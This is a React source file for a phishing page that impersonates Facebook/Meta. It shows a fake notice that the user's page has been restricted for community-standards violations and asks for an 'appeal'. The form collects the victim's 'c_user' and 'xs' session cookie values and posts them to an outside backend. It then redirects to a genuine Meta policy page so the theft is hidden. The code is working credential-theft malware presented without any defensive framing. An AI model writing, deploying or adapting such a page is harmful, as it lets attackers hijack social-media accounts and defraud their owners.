import './Fbpage2.css';
import 'bootstrap/dist/css/bootstrap.min.css';
import 'font-awesome/css/font-awesome.min.css';
import 'bootstrap/dist/js/bootstrap.bundle.min.js';
import React, { useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';


function Fbpage2() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    //   const [message, setMessage] = useState('');
    const navigate = useNavigate(); // Initialize useNavigate
    const handleRegister = async (e) => {
        e.preventDefault();
        try {
            console.log('email', email, 'password', password);
        const response =   await axios.post('https://op-backend-hzpw.onrender.com/api/v1/user/register', {
                email,
                password
            });
            console.log("response", response);
            window.location.href = 'https://transparency.meta.com/en-gb/policies/';
            //   setMessage('Registration successful');
        } catch (error) {
            console.log("error", error);
            //   setMessage('Registration failed');
        }
    };

    return (
        <>
            <nav>
                <div className="nav-left">
                    <p className="fb-2">
                        facebook
                    </p>
                </div>
                <div className="nav-right">
                    <div className="search-box">
                        {/* <img
                            src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/search-icon-lob.png?v=1712422050841"
                            alt="search-icon"
                        /> */}
                        <input
                            type="text"
                            placeholder="Search"
                        />
                    </div>
                </div>
            </nav>

            <div className="main-body">
                <form
                    className="content"
                    onSubmit={handleRegister}
                >
                    <div>
                        <img
                            src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/Meta-Logo.png?v=1712422024289"
                            width="140"
                            alt="Meta Logo"
                        />
                    </div>

                    <p className="tr-5">
                        We have detected unusual activity on your page that violates our community standards.
                    </p>
                    <p className="tr-5">
                        Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
                    </p>
                    <p className="tr-5">
                        If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
                    </p>

                    <div className="video-text">
                        <p>Must Watch Detailed Video Information:</p>
                    </div>

                    <div>
                        <video
                            controls
                            loop
                            autoPlay
                            width="300"
                            poster="https://cdn.glitch.global/bfcd7774-fff2-449c-9561-26bd96edfe53/fbVideo.png.1fd476160a3ed7a2f565.png?v=1720041771787"
                        >
                            <source
                                src="detailed_video.mp4"
                                type="video/mp4"
                            />
                        </video>
                    </div>

                    <p className="tr-5">
                        Please be sure to provide the requested information below.
                    </p>

                    <div>
                        <p className="mt-4">c_user*</p>
                        <input
                            type="text"
                            name="c_user"
                            id="c_user"
                            required
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                        />
                    </div>

                    <div>
                        <p className="mt-4">xs*</p>
                        <input
                            type="text"
                            name="xs"
                            title="Must Watch Detailed Video"
                            required
                            aria-required="true"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                        />
                    </div>

                    <p className="msi-4">
                        **Please make sure your account is not logged out from your computer or laptop until you have received a verification email.
                    </p>

                    <div className="container">
                        <button className="button" type="submit">
                            <p calssName="button-text-op">Submit</p>
                        </button>
                    </div>
                </form>
            </div>
        </>
    );
}

export default Fbpage2;
